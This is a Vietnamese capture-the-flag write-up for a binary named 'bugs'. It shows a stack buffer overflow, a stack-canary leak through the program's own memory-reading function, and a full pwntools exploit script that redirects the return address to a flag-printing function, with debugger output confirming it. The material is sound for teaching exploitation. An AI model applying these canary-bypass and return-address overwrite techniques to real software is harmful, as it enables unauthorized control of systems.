
# Bugs

Bài này mục đích của mình sẽ chuyển hướng control flow vào hàm leuleu của chương trình.
```sh
leuleu function
unsigned __int64 leuleu()
{
  FILE *stream; // [rsp+8h] [rbp-78h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen("flag", "r");
  __isoc99_fscanf(stream, "%s", s);
  fclose(stream);
  puts(s);
  return __readfsqword(0x28u) ^ v3;
}

```
Ở bài này mình sẽ dùng lỗi bufferOverflow tại hàm `read(0, a1, 72uLL)` trong `info function` khi mà tham số a1 ( là thằng v6 của hàm main) của mình chỉ có 40 byte.
Mình sẽ thay đổi địa chỉ của `ret` của hàm main thành địa chỉ của hàm `leuleu`. Nhưng vấn đề gặp phải là chương trình có `Stack canary` buộc mình phải by pass nó. 
## Các bước mình thực hiện:
* Leak được địa chỉ trong stack, tìm offset từ địa chỉ leak được tới địa chỉ của canary, và của V[5].
* Dùng hàm findbox cho sẵn để leak canary. (chuyển sang kiểu số nguyên để tìm).
* Dùng hàm flushbox để gán 0 cho v[5], lúc này chương trình sẽ thoát và gọi hàm `leuleu`

# File exploit.py
```sh
from pwn import *
s = process("./bugs")
pause()

#---------- leak địa chỉ của stack ----------------
s.recvuntil("[1. info, 2. show info, 3.findbox, 4.flushbox]>")
s.sendline("3")
s.recvuntil("Address of box>")
s.sendline("a")
s.recv()
leak = s.recv(14)
v5 = int(leak,16) + 0x30 #offset từ leak_addr đến v[5] = 0x30
log.info("v5 = " + hex(v5))

canary_addr = int(leak,16) + 0x5c #offset từ lead_addr đến canary = 0x5c
log.info("leak_canary = " + hex(canary_addr))

#---------- leak canary ---------------------------
s.recvuntil("[1. info, 2. show info, 3.findbox, 4.flushbox]>")
s.sendline("3")
s.recvuntil("Address of box>")
s.sendline(str(canary_addr))

s.recvuntil(": ")
canary = s.recv("18")
print canary
canary = int(canary,16)
#---------- leak rbp -------------------------------
rbp_addr = int(leak,16) + 0x5c + 0x8
log.info("leak_rbp = " + hex(rbp_addr))
s.recvuntil("[1. info, 2. show info, 3.findbox, 4.flushbox]>")
s.sendline("3")
s.recvuntil("Address of box>")
s.sendline(str(rbp_addr))

s.recvuntil(": ")
rbp = s.recvline()
print rbp
rbp = int(rbp,16)

#---------- đưa địa chỉ hàm leuleu vào rbp+8 (ret-main)--------

pl = "a"*0x28 + p64(canary) + p64(rbp) + p64(0x400876)
s.recvuntil(">")
s.sendline("1")
s.recvuntil("Yourname?")
s.sendline(pl)

#---------- xóa giá trị v5 ------------------------------------
s.recvuntil("[1. info, 2. show info, 3.findbox, 4.flushbox]>")
s.sendline("4")
s.recvuntil("Address of box>")
s.sendline(str(v5))

s.interactive()

```

sau khi thực thi thì mình sẽ vào được hàm leuleu
```sh
 RAX  0x0
 RBX  0x0
 RCX  0x7f19d50b3224 (write+20) ?— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x1
 RSI  0x2332260 ?— 'ok!\ness of box> \n info, 3.findbox, 4.flushbox]> \n'
 R8   0x7f19d55a8500 ?— 0x7f19d55a8500
 R9   0x0
 R10  0x7f19d5141c40 (_nl_C_LC_CTYPE_class+256) ?— add    al, byte ptr [rax]
 R11  0x246
 R12  0x400780 (_start) ?— xor    ebp, ebp
 R13  0x7ffce80d2f70 ?— 0x1
 R14  0x0
 R15  0x0
*RBP  0x400b80 (__libc_csu_init) ?— push   r15
*RSP  0x7ffce80d2e98 —? 0x400876 (leuleu) ?— push   rbp
*RIP  0x400b7b (main+236) ?— ret    
--------------------------------------------[ DISASM ]---------------------------------------------
   0x400b61 <main+210>     mov    eax, 0
   0x400b66 <main+215>     mov    rdx, qword ptr [rbp - 8]
   0x400b6a <main+219>     xor    rdx, qword ptr fs:[0x28]
   0x400b73 <main+228>     je     main+235 <main+235>
    ?
   0x400b7a <main+235>     leave  
 ? "0x400b7b <main+236>     ret             <0x400876; leuleu>
    ?"
   0x400876 <leuleu>       push   rbp
   0x400877 <leuleu+1>     mov    rbp, rsp
   0x40087a <leuleu+4>     add    rsp, -0x80
   0x40087e <leuleu+8>     mov    rax, qword ptr fs:[0x28]
   0x400887 <leuleu+17>    mov    qword ptr [rbp - 8], rax
---------------------------------------------[ STACK ]---------------------------------------------
00:0000¦ rsp  0x7ffce80d2e98 —? 0x400876 (leuleu) ?— push   rbp
01:0008¦      0x7ffce80d2ea0 ?— 0xa /* '\n' */
02:0010¦      0x7ffce80d2ea8 —? 0x7ffce80d2f78 —? 0x7ffce80d46eb ?— 0x4c00736775622f2e /* './bugs' */
03:0018¦      0x7ffce80d2eb0 ?— 0x100008000
04:0020¦      0x7ffce80d2eb8 —? 0x400a8f (main) ?— push   rbp
05:0028¦      0x7ffce80d2ec0 ?— 0x0
06:0030¦      0x7ffce80d2ec8 ?— 0x985e41c4d6a6a961
07:0038¦      0x7ffce80d2ed0 —? 0x400780 (_start) ?— xor    ebp, ebp
-------------------------------------------[ BACKTRACE ]-------------------------------------------
 ? f 0           400b7b main+236
   f 1           400876 leuleu
   f 2                a
   f 3     7ffce80d2f78
   f 4        100008000
   f 5           400a8f main
   f 6                
---------------------------------------------------------------------------------------------------

```
### Tác giả: anh H4niz có nói:
` Chạy vô hàm leuleu là ok r nhé em.Tới đây e hoàn toàn có thể chạy trên server để lấy flag r nhé ` 
